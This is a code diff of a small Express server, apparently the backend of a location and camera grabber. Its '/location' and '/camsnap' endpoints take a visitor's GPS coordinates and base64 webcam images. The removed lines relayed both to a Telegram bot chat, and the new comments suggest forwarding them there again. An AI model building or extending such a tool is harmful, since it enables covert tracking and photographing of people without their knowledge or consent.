@@ -1,59 +1,28 @@
 const express = require("express");
-const fetch = require("node-fetch");
-
 const app = express();
+
 app.use(express.json({ limit: "20mb" }));
+app.use(express.static("public"));
 
-// 🔑 GANTI INI
-const BOT_TOKEN = "ISI_BOT_TOKEN";
-const CHAT_ID = "ISI_CHAT_ID";
+// 📍 terima lokasi
+app.post("/location", (req, res) => {
+  const { lat, lon, acc } = req.body;
+  console.log("LOCATION:", lat, lon, acc);
 
-// 📍 LOCATION
-app.post("/location", async (req, res) => {
-  try {
-    const { lat, lon, acc } = req.body;
-
-    const text = `📍 Lokasi:\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}`;
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text
-      })
-    });
-
-    res.send("OK");
-  } catch (e) {
-    console.log("Error location:", e);
-    res.status(500).send("Error");
-  }
+  // 👉 di sini kamu bisa teruskan ke layanan lain (mis. Telegram)
+  res.json({ ok: true });
 });
 
-// 📷 CAMERA
-app.post("/camsnap", async (req, res) => {
-  try {
-    const { image } = req.body;
+// 📷 terima gambar
+app.post("/camsnap", (req, res) => {
+  const { image } = req.body;
+  console.log("IMAGE received (base64 length):", image?.length);
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: image
-      })
-    });
-
-    res.send("OK");
-  } catch (e) {
-    console.log("Error cam:", e);
-    res.status(500).send("Error");
-  }
+  // 👉 di sini kamu bisa simpan / forward ke layanan lain
+  res.json({ ok: true });
 });
 
-app.get("/", (req, res) => {
-  res.send("Server aktif");
-});
+app.get("/health", (req, res) => res.send("OK"));
 
-app.listen(3000, () => console.log("Server running"));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log("Server running on", PORT));
